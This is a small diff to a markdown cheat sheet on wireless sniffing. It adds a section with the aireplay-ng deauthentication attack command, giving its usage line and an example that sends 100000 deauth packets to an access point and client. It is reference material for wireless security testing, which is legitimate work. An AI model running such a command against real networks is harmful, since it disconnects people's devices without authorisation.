@@ -46,5 +46,14 @@ Simple sniffing 2.4Gz
 airodump-ng <INTERFACE>
 ```
 
+## Deauth Attack with `aireplay-ng`
+
+usage : `aireplay-ng --deauth <#DEAUTH_PACKETS> -a <NETWORK_MAC> -c <TARGET_MAC> <INTERFACE>`
+
+example : 
+```bash
+aireplay-ng --deauth 100000 -a 11:22:33:44:55:66 -c 00:11:22:33:44:55 mon0
+```
+
 
 
